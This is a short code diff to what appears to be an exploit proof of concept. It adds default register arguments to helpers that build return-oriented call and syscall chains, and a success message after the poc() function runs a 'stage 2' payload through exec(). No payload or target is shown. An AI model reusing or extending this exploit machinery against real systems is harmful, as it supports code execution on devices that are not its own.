@@ -706,7 +706,7 @@ class Executable(object):
             for _ in range(55):
                 self.chain.push_value(0)
 
-    def setup_call_chain(self, func_addr, rdi, rsi, rdx, rcx, r8, r9):
+    def setup_call_chain(self, func_addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
         self.chain.push_call(
             func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
         )
@@ -716,7 +716,9 @@ class Executable(object):
         for _ in range(55):
             self.chain.push_value(0)
 
-    def setup_syscall_chain(self, syscall_number, rdi, rsi, rdx, rcx, r8, r9):
+    def setup_syscall_chain(
+        self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0
+    ):
         self.chain.push_syscall(
             syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
         )
@@ -1305,6 +1307,7 @@ def poc():
         scope = dict(locals(), **globals())
         try:
             exec(stage2_str, scope, scope)
+            print("Stage 2 payload executed successfully")
         except Exception as e:
             exc_msg = traceback.format_exc()
             print_exc(exc_msg)  # this exists in globals()
